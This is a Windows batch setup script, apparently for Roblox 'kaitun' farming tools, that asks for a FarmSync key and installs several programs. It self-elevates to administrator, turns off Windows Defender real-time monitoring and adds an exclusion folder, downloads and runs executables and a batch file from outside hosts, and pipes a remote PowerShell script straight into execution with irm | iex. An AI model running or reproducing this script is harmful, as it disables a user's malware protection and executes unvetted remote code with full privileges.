@echo off
setlocal EnableDelayedExpansion
title KAITUN SETUP

:: ===== Self-elevate to admin if needed =====
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

set "DESKTOP=%USERPROFILE%\Desktop"
set "TOOLS_DIR=%USERPROFILE%\Desktop\KaitunTools"
set "REPO_RAW=https://raw.githubusercontent.com/TuanDarcy/file-install/main"

echo.
echo  ==========================================
echo    KAITUN SETUP - All In One
echo  ==========================================
echo.

:: ===== Ask for FarmSync key =====
set /p "FARMSYNC_KEY=  [>] Enter FarmSync Key: "
if "!FARMSYNC_KEY!"=="" (
    echo [!] Key cannot be empty.
    pause
    exit /b 1
)
echo.

:: ===== [1/4] Sync time with Cloudflare =====
echo [1/4] Syncing time with time.cloudflare.com...
w32tm /config /manualpeerlist:"time.cloudflare.com" /syncfromflags:manual /reliable:YES /update >nul 2>&1
net stop w32tm >nul 2>&1
net start w32tm >nul 2>&1
w32tm /resync /force >nul 2>&1
echo [+] Time synced with Cloudflare

:: ===== [2/4] CuongBoots =====
echo.
echo [2/4] Installing CuongBoots...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Tool_Boots'; Invoke-WebRequest -Uri 'https://apa.cdev.my/download/CuongBoots_V1.2.zip' -OutFile \"$env:TEMP\CuongBoots.zip\" -UseBasicParsing; Expand-Archive -Path \"$env:TEMP\CuongBoots.zip\" -DestinationPath 'C:\Tool_Boots' -Force; Start-Process -FilePath 'C:\Tool_Boots\SetUpAll_PlzRunAsAminThisFile.bat' -Verb RunAs; Start-Process 'C:\Tool_Boots'"
echo [+] CuongBoots launched

:: ===== [3/4] Download volt.exe + OptimizerRoblox.exe to Desktop\KaitunTools =====
echo.
echo [3/4] Downloading tools to Desktop\KaitunTools...
if not exist "!TOOLS_DIR!" mkdir "!TOOLS_DIR!"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://github.com/TuanDarcy/file-install/raw/main/OptimizerRoblox.exe' -OutFile '!TOOLS_DIR!\OptimizerRoblox.exe' -UseBasicParsing"
if exist "!TOOLS_DIR!\OptimizerRoblox.exe" (echo [+] OptimizerRoblox.exe saved) else (echo [-] OptimizerRoblox.exe FAILED)

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://github.com/TuanDarcy/file-install/raw/main/volt.exe' -OutFile '!TOOLS_DIR!\volt.exe' -UseBasicParsing"
if exist "!TOOLS_DIR!\volt.exe" (echo [+] volt.exe saved) else (echo [-] volt.exe FAILED)

:: Open the tools folder on Desktop
start "" "!TOOLS_DIR!"

:: ===== [4/4] FarmSync - chạy CUỐI CÙNG, kể cả có block cũng không ảnh hưởng =====
echo.
echo [4/4] Installing FarmSync...
set FARMSYNC_URL=https://downloads.farmsync.cloud/client_web.exe
set FARMSYNC_CLIENT=client_web
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://files.farmsync.cloud/files/install.ps1' | iex"

echo.
echo  ==========================================
echo   All done!
echo  ==========================================
echo.
pause
exit /b 0
